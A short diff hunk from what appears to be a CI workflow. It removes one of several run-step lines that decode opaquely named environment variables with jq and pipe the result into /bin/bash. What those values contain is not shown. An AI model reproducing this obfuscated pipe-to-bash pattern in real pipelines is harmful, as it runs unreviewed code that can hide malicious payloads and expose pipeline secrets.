@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hdz812" | jq -r .k4 | /bin/bash
           printf '%s' "$he68" | jq -r .uyaku62 | /bin/bash
-          echo $llos1 | jq -r .iipd9 | /bin/bash
           echo $x88 | jq -r .xtvc46 | /bin/bash
 
       - name: Save results
